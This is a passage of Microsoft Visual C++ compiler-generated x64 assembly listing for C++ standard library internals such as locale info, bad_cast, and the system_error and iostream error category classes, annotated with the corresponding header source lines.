	lea	rcx, OFFSET FLAT:??_C@_0BA@ELKIONDK@bad?5locale?5name@
	call	?_Xruntime_error@std@@YAXPEBD@Z		; std::_Xruntime_error
	npad	1
$LN1@Locinfo:

; 253  :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
$LN11@Locinfo:
??0_Locinfo@std@@QEAA@PEBD@Z ENDP			; std::_Locinfo::_Locinfo
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
this$ = 48
_Pch$ = 56
?dtor$0@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA PROC	; `std::_Locinfo::_Locinfo'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR this$[rbp]
	call	??1_Lockit@std@@QEAA@XZ			; std::_Lockit::~_Lockit
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA ENDP	; `std::_Locinfo::_Locinfo'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
this$ = 48
_Pch$ = 56
?dtor$1@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA PROC	; `std::_Locinfo::_Locinfo'::`1'::dtor$1
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR this$[rbp]
	add	rcx, 8
	call	??1?$_Yarn@D@std@@QEAA@XZ		; std::_Yarn<char>::~_Yarn<char>
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$1@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA ENDP	; `std::_Locinfo::_Locinfo'::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
this$ = 48
_Pch$ = 56
?dtor$2@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA PROC	; `std::_Locinfo::_Locinfo'::`1'::dtor$2
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR this$[rbp]
	add	rcx, 24
	call	??1?$_Yarn@D@std@@QEAA@XZ		; std::_Yarn<char>::~_Yarn<char>
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$2@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA ENDP	; `std::_Locinfo::_Locinfo'::`1'::dtor$2
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
this$ = 48
_Pch$ = 56
?dtor$3@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA PROC	; `std::_Locinfo::_Locinfo'::`1'::dtor$3
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR this$[rbp]
	add	rcx, 40					; 00000028H
	call	??1?$_Yarn@_W@std@@QEAA@XZ		; std::_Yarn<wchar_t>::~_Yarn<wchar_t>
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$3@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA ENDP	; `std::_Locinfo::_Locinfo'::`1'::dtor$3
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
this$ = 48
_Pch$ = 56
?dtor$4@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA PROC	; `std::_Locinfo::_Locinfo'::`1'::dtor$4
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR this$[rbp]
	add	rcx, 56					; 00000038H
	call	??1?$_Yarn@_W@std@@QEAA@XZ		; std::_Yarn<wchar_t>::~_Yarn<wchar_t>
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$4@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA ENDP	; `std::_Locinfo::_Locinfo'::`1'::dtor$4
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
this$ = 48
_Pch$ = 56
?dtor$5@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA PROC	; `std::_Locinfo::_Locinfo'::`1'::dtor$5
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR this$[rbp]
	add	rcx, 72					; 00000048H
	call	??1?$_Yarn@D@std@@QEAA@XZ		; std::_Yarn<char>::~_Yarn<char>
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$5@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA ENDP	; `std::_Locinfo::_Locinfo'::`1'::dtor$5
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
this$ = 48
_Pch$ = 56
?dtor$6@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA PROC	; `std::_Locinfo::_Locinfo'::`1'::dtor$6
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR this$[rbp]
	add	rcx, 88					; 00000058H
	call	??1?$_Yarn@D@std@@QEAA@XZ		; std::_Yarn<char>::~_Yarn<char>
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$6@?0???0_Locinfo@std@@QEAA@PEBD@Z@4HA ENDP	; `std::_Locinfo::_Locinfo'::`1'::dtor$6
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_G_Facet_base@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 48
__flags$ = 56
??_G_Facet_base@std@@UEAAPEAXI@Z PROC			; std::_Facet_base::`scalar deleting destructor', COMDAT
$LN4:
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??1_Facet_base@std@@UEAA@XZ		; std::_Facet_base::~_Facet_base
	mov	eax, DWORD PTR __flags$[rsp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN2@scalar
	mov	edx, 8
	mov	rcx, QWORD PTR this$[rsp]
	call	??3@YAXPEAX_K@Z				; operator delete
$LN2@scalar:
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??_G_Facet_base@std@@UEAAPEAXI@Z ENDP			; std::_Facet_base::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??0_Facet_base@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0_Facet_base@std@@QEAA@XZ PROC			; std::_Facet_base::_Facet_base, COMDAT
	mov	QWORD PTR [rsp+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7_Facet_base@std@@6B@
	mov	QWORD PTR [rax], rcx
	mov	rax, QWORD PTR this$[rsp]
	ret	0
??0_Facet_base@std@@QEAA@XZ ENDP			; std::_Facet_base::_Facet_base
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xfacet
;	COMDAT ??1_Facet_base@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1_Facet_base@std@@UEAA@XZ PROC			; std::_Facet_base::~_Facet_base, COMDAT

; 27   :     virtual __CLR_OR_THIS_CALL ~_Facet_base() noexcept {} // ensure that derived classes can be destroyed properly

	mov	QWORD PTR [rsp+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7_Facet_base@std@@6B@
	mov	QWORD PTR [rax], rcx
	ret	0
??1_Facet_base@std@@UEAA@XZ ENDP			; std::_Facet_base::~_Facet_base
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\typeinfo
;	COMDAT ?_Throw_bad_cast@std@@YAXXZ
_TEXT	SEGMENT
$T1 = 32
?_Throw_bad_cast@std@@YAXXZ PROC			; std::_Throw_bad_cast, COMDAT

; 62   : [[noreturn]] inline void _Throw_bad_cast() {

$LN3:
	sub	rsp, 72					; 00000048H

; 63   :     _THROW(bad_cast{});

	lea	rcx, QWORD PTR $T1[rsp]
	call	??0bad_cast@std@@QEAA@XZ		; std::bad_cast::bad_cast
	lea	rdx, OFFSET FLAT:_TI2?AVbad_cast@std@@
	lea	rcx, QWORD PTR $T1[rsp]
	call	_CxxThrowException
$LN2@Throw_bad_:

; 64   : }

	add	rsp, 72					; 00000048H
	ret	0
?_Throw_bad_cast@std@@YAXXZ ENDP			; std::_Throw_bad_cast
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_Gbad_cast@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 48
__flags$ = 56
??_Gbad_cast@std@@UEAAPEAXI@Z PROC			; std::bad_cast::`scalar deleting destructor', COMDAT
$LN4:
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??1bad_cast@std@@UEAA@XZ
	mov	eax, DWORD PTR __flags$[rsp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN2@scalar
	mov	edx, 24
	mov	rcx, QWORD PTR this$[rsp]
	call	??3@YAXPEAX_K@Z				; operator delete
$LN2@scalar:
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??_Gbad_cast@std@@UEAAPEAXI@Z ENDP			; std::bad_cast::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??0bad_cast@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 48
__that$ = 56
??0bad_cast@std@@QEAA@AEBV01@@Z PROC			; std::bad_cast::bad_cast, COMDAT
$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rdx, QWORD PTR __that$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??0exception@std@@QEAA@AEBV01@@Z	; std::exception::exception
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7bad_cast@std@@6B@
	mov	QWORD PTR [rax], rcx
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??0bad_cast@std@@QEAA@AEBV01@@Z ENDP			; std::bad_cast::bad_cast
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1bad_cast@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1bad_cast@std@@UEAA@XZ PROC				; std::bad_cast::~bad_cast, COMDAT
$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??1exception@std@@UEAA@XZ		; std::exception::~exception
	add	rsp, 40					; 00000028H
	ret	0
??1bad_cast@std@@UEAA@XZ ENDP				; std::bad_cast::~bad_cast
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vcruntime_typeinfo.h
;	COMDAT ??0bad_cast@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??0bad_cast@std@@QEAA@XZ PROC				; std::bad_cast::bad_cast, COMDAT

; 153  :     {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 152  :         : exception("bad cast", 1)

	mov	r8d, 1
	lea	rdx, OFFSET FLAT:??_C@_08EPJLHIJG@bad?5cast@
	mov	rcx, QWORD PTR this$[rsp]
	call	??0exception@std@@QEAA@QEBDH@Z		; std::exception::exception

; 153  :     {

	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7bad_cast@std@@6B@
	mov	QWORD PTR [rax], rcx

; 154  :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??0bad_cast@std@@QEAA@XZ ENDP				; std::bad_cast::bad_cast
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\system_error
;	COMDAT ??$_Immortalize_memcpy_image@V_Iostream_error_category2@std@@@std@@YAAEBV_Iostream_error_category2@0@XZ
_TEXT	SEGMENT
??$_Immortalize_memcpy_image@V_Iostream_error_category2@std@@@std@@YAAEBV_Iostream_error_category2@0@XZ PROC ; std::_Immortalize_memcpy_image<std::_Iostream_error_category2>, COMDAT

; 633  :     static _Constexpr_immortalize_impl<_Ty> _Static;
; 634  :     return _Static._Storage;

	lea	rax, OFFSET FLAT:?_Static@?1???$_Immortalize_memcpy_image@V_Iostream_error_category2@std@@@std@@YAAEBV_Iostream_error_category2@1@XZ@4U?$_Constexpr_immortalize_impl@V_Iostream_error_category2@std@@@1@A ; `std::_Immortalize_memcpy_image<std::_Iostream_error_category2>'::`2'::_Static

; 635  : }

	ret	0
??$_Immortalize_memcpy_image@V_Iostream_error_category2@std@@@std@@YAAEBV_Iostream_error_category2@0@XZ ENDP ; std::_Immortalize_memcpy_image<std::_Iostream_error_category2>
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_G_Iostream_error_category2@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 48
__flags$ = 56
??_G_Iostream_error_category2@std@@UEAAPEAXI@Z PROC	; std::_Iostream_error_category2::`scalar deleting destructor', COMDAT
$LN4:
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??1_Iostream_error_category2@std@@UEAA@XZ
	mov	eax, DWORD PTR __flags$[rsp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN2@scalar
	mov	edx, 16
	mov	rcx, QWORD PTR this$[rsp]
	call	??3@YAXPEAX_K@Z				; operator delete
$LN2@scalar:
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??_G_Iostream_error_category2@std@@UEAAPEAXI@Z ENDP	; std::_Iostream_error_category2::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1_Iostream_error_category2@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1_Iostream_error_category2@std@@UEAA@XZ PROC		; std::_Iostream_error_category2::~_Iostream_error_category2, COMDAT
$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??1error_category@std@@UEAA@XZ		; std::error_category::~error_category
	add	rsp, 40					; 00000028H
	ret	0
??1_Iostream_error_category2@std@@UEAA@XZ ENDP		; std::_Iostream_error_category2::~_Iostream_error_category2
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\system_error
;	COMDAT ?message@_Iostream_error_category2@std@@UEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z
_TEXT	SEGMENT
$T1 = 32
_Iostream_error_length$2 = 40
this$ = 64
__$ReturnUdt$ = 72
_Errcode$ = 80
?message@_Iostream_error_category2@std@@UEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z PROC ; std::_Iostream_error_category2::message, COMDAT

; 521  :     _NODISCARD string message(int _Errcode) const override {

$LN7:
	mov	DWORD PTR [rsp+24], r8d
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	DWORD PTR $T1[rsp], 0

; 522  :         if (_Errcode == static_cast<int>(io_errc::stream)) {

	cmp	DWORD PTR _Errcode$[rsp], 1
	jne	SHORT $LN2@message

; 523  :             static constexpr char _Iostream_error[] = "iostream stream error";
; 524  :             constexpr size_t _Iostream_error_length = sizeof(_Iostream_error) - 1; // TRANSITION, DevCom-906503

	mov	QWORD PTR _Iostream_error_length$2[rsp], 21

; 525  :             return string(_Iostream_error, _Iostream_error_length);

	mov	r8d, 21
	lea	rdx, OFFSET FLAT:?_Iostream_error@?4??message@_Iostream_error_category2@std@@UEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@H@Z@4QBDB ; `std::_Iostream_error_category2::message'::`5'::_Iostream_error
	mov	rcx, QWORD PTR __$ReturnUdt$[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	eax, DWORD PTR $T1[rsp]
	or	eax, 1
	mov	DWORD PTR $T1[rsp], eax
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]
	jmp	SHORT $LN1@message

; 526  :         } else {

	jmp	SHORT $LN1@message
$LN2@message:

; 527  :             return _Syserror_map(_Errcode);

	mov	ecx, DWORD PTR _Errcode$[rsp]
	call	?_Syserror_map@std@@YAPEBDH@Z		; std::_Syserror_map
	mov	rdx, rax
	mov	rcx, QWORD PTR __$ReturnUdt$[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	eax, DWORD PTR $T1[rsp]
	or	eax, 1
	mov	DWORD PTR $T1[rsp], eax
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]
$LN1@message:

; 528  :         }
; 529  :     }

	add	rsp, 56					; 00000038H
	ret	0
?message@_Iostream_error_category2@std@@UEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z ENDP ; std::_Iostream_error_category2::message
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\system_error
;	COMDAT ?name@_Iostream_error_category2@std@@UEBAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?name@_Iostream_error_category2@std@@UEBAPEBDXZ PROC	; std::_Iostream_error_category2::name, COMDAT

; 517  :     _NODISCARD const char* name() const noexcept override {

	mov	QWORD PTR [rsp+8], rcx

; 518  :         return "iostream";

	lea	rax, OFFSET FLAT:??_C@_08LLGCOLLL@iostream@

; 519  :     }

	ret	0
?name@_Iostream_error_category2@std@@UEBAPEBDXZ ENDP	; std::_Iostream_error_category2::name
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_Gsystem_error@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 48
__flags$ = 56
??_Gsystem_error@std@@UEAAPEAXI@Z PROC			; std::system_error::`scalar deleting destructor', COMDAT
$LN4:
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??1system_error@std@@UEAA@XZ
	mov	eax, DWORD PTR __flags$[rsp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN2@scalar
	mov	edx, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??3@YAXPEAX_K@Z				; operator delete
$LN2@scalar:
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??_Gsystem_error@std@@UEAAPEAXI@Z ENDP			; std::system_error::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??0system_error@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 48
__that$ = 56
??0system_error@std@@QEAA@AEBV01@@Z PROC		; std::system_error::system_error, COMDAT
$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rdx, QWORD PTR __that$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??0_System_error@std@@QEAA@AEBV01@@Z
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7system_error@std@@6B@
	mov	QWORD PTR [rax], rcx
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??0system_error@std@@QEAA@AEBV01@@Z ENDP		; std::system_error::system_error
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1system_error@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1system_error@std@@UEAA@XZ PROC			; std::system_error::~system_error, COMDAT
$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??1_System_error@std@@UEAA@XZ
	add	rsp, 40					; 00000028H
	ret	0
??1system_error@std@@UEAA@XZ ENDP			; std::system_error::~system_error
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\system_error
;	COMDAT ??0system_error@std@@QEAA@Verror_code@1@PEBD@Z
_TEXT	SEGMENT
$T1 = 32
$T2 = 48
__$ArrayPad$ = 80
this$ = 128
_Errcode$ = 136
_Message$ = 144
??0system_error@std@@QEAA@Verror_code@1@PEBD@Z PROC	; std::system_error::system_error, COMDAT

; 451  :     system_error(error_code _Errcode, const char* _Message) : _Mybase(_Errcode, _Message) {}

$LN5:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 104				; 00000068H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax
	mov	rdx, QWORD PTR _Message$[rsp]
	lea	rcx, QWORD PTR $T2[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	npad	1
	lea	rax, QWORD PTR $T1[rsp]
	mov	rdi, rax
	mov	rsi, QWORD PTR _Errcode$[rsp]
	mov	ecx, 16
	rep movsb
	lea	r8, QWORD PTR $T2[rsp]
	lea	rdx, QWORD PTR $T1[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??0_System_error@std@@IEAA@Verror_code@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ; std::_System_error::_System_error
	npad	1
	lea	rcx, QWORD PTR $T2[rsp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7system_error@std@@6B@
	mov	QWORD PTR [rax], rcx
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	add	rsp, 104				; 00000068H
	pop	rdi
	pop	rsi
	ret	0
??0system_error@std@@QEAA@Verror_code@1@PEBD@Z ENDP	; std::system_error::system_error
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 48
__$ArrayPad$ = 80
this$ = 128
_Errcode$ = 136
_Message$ = 144
?dtor$0@?0???0system_error@std@@QEAA@Verror_code@1@PEBD@Z@4HA PROC ; `std::system_error::system_error'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR $T2[rbp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???0system_error@std@@QEAA@Verror_code@1@PEBD@Z@4HA ENDP ; `std::system_error::system_error'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_G_System_error@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 48
__flags$ = 56
??_G_System_error@std@@UEAAPEAXI@Z PROC			; std::_System_error::`scalar deleting destructor', COMDAT
$LN4:
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??1_System_error@std@@UEAA@XZ
	mov	eax, DWORD PTR __flags$[rsp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN2@scalar
	mov	edx, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??3@YAXPEAX_K@Z				; operator delete
$LN2@scalar:
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??_G_System_error@std@@UEAAPEAXI@Z ENDP			; std::_System_error::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??0_System_error@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 64
__that$ = 72
??0_System_error@std@@QEAA@AEBV01@@Z PROC		; std::_System_error::_System_error, COMDAT
$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 40					; 00000028H
	mov	rdx, QWORD PTR __that$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??0runtime_error@std@@QEAA@AEBV01@@Z
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7_System_error@std@@6B@
	mov	QWORD PTR [rax], rcx
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR __that$[rsp]
	lea	rdi, QWORD PTR [rax+24]
	lea	rsi, QWORD PTR [rcx+24]
	mov	ecx, 16
	rep movsb
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	pop	rdi
	pop	rsi
	ret	0
??0_System_error@std@@QEAA@AEBV01@@Z ENDP		; std::_System_error::_System_error
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1_System_error@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1_System_error@std@@UEAA@XZ PROC			; std::_System_error::~_System_error, COMDAT
$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??1runtime_error@std@@UEAA@XZ
	add	rsp, 40					; 00000028H
	ret	0
??1_System_error@std@@UEAA@XZ ENDP			; std::_System_error::~_System_error
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\system_error
;	COMDAT ??0_System_error@std@@IEAA@Verror_code@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z
_TEXT	SEGMENT
$T1 = 32
tv131 = 40
tv69 = 48
tv133 = 56
$T2 = 64
$T3 = 80
$T4 = 112
__$ArrayPad$ = 144
this$ = 192
_Errcode$ = 200
_Message$ = 208
??0_System_error@std@@IEAA@Verror_code@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z PROC ; std::_System_error::_System_error, COMDAT

; 436  :     _System_error(error_code _Errcode, const string& _Message)

$LN6:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 168				; 000000a8H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax

; 437  :         : runtime_error(_Makestr(_Errcode, _Message)), _Mycode(_Errcode) {}

	lea	rax, QWORD PTR $T3[rsp]
	mov	QWORD PTR $T1[rsp], rax
	mov	rdx, QWORD PTR _Message$[rsp]
	mov	rcx, QWORD PTR $T1[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	QWORD PTR tv131[rsp], rax
	lea	rax, QWORD PTR $T2[rsp]
	mov	rdi, rax
	mov	rsi, QWORD PTR _Errcode$[rsp]
	mov	ecx, 16
	rep movsb
	mov	r8, QWORD PTR tv131[rsp]
	lea	rdx, QWORD PTR $T2[rsp]
	lea	rcx, QWORD PTR $T4[rsp]
	call	?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z ; std::_System_error::_Makestr
	mov	QWORD PTR tv69[rsp], rax
	mov	rax, QWORD PTR tv69[rsp]
	mov	QWORD PTR tv133[rsp], rax
	mov	rdx, QWORD PTR tv133[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??0runtime_error@std@@QEAA@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ; std::runtime_error::runtime_error
	npad	1
	lea	rcx, QWORD PTR $T4[rsp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7_System_error@std@@6B@
	mov	QWORD PTR [rax], rcx
	mov	rax, QWORD PTR this$[rsp]
